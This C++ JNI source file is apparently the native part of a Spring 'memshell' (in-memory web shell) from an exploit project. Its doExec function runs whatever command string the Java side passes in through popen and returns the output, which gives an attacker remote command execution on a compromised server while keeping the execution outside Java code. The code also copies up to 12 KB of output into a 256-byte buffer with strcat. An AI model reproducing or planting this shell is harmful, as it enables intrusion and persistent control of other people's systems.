#include<jni.h>
#include<stdio.h>
#include<cstdlib>
#include<cstring>
#include "xyz_eki_marshalexp_memshell_MSpringJNIController.h"

int execmd(const char *cmd, char *result)
{
    char buffer[1024*12];              //定义缓冲区
    FILE *pipe = popen(cmd, "r"); //打开管道，并执行命令
    if (!pipe)
        return 0; //返回0表示运行失败

    while (!feof(pipe))
    {
        if (fgets(buffer, 256, pipe))
        { //将管道输出到result中
            strcat(result, buffer);
        }
    }
    pclose(pipe); //关闭管道
    return 1;      //返回1表示运行成功
}


JNIEXPORT jstring JNICALL Java_xyz_eki_marshalexp_memshell_MSpringJNIController_doExec(JNIEnv *env, jobject thisObj,jstring jstr) {
    const char *cstr = env->GetStringUTFChars(jstr, NULL);
    char result[1024 * 12] = ""; //定义存放结果的字符串数组
    if (1 == execmd(cstr, result))
    {
        // printf(result);
    }

    char return_messge[256] = "";
    strcat(return_messge, result);
    jstring cmdresult = env->NewStringUTF(return_messge);
    //system();

    return cmdresult;
}

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved){
    return JNI_VERSION_1_4; //这里很重要，必须返回版本，否则加载会失败。
}